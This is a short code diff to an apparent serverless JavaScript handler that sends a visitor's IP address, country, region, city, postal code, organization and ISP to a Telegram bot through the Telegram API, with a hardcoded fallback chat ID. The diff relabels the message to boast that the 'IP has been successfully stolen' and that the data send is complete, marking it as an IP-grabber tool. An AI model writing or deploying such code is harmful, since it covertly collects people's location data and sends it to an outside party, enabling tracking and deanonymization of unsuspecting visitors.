@@ -12,13 +12,15 @@ exports.handler = async (event) => {
         const CHAT_ID = process.env.CHAT_ID || '5764387936';
 
         const message = `
-IP: ${ip}
-Country: ${country}
-Region: ${region}
-City: ${city}
-Postal: ${postal}
-Organization: ${org}
-ISP: ${isp}
+⚡ IP has been successfully stolen! ⚡
+🔹 IP: ${ip}
+🌍 Country: ${country}
+🏞️ Region: ${region}
+🌆 City: ${city}
+📮 Postal: ${postal}
+🏢 Organization: ${org}
+📡 ISP: ${isp}
+🔐 Status: Data send complete ✅
         `.trim();
 
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
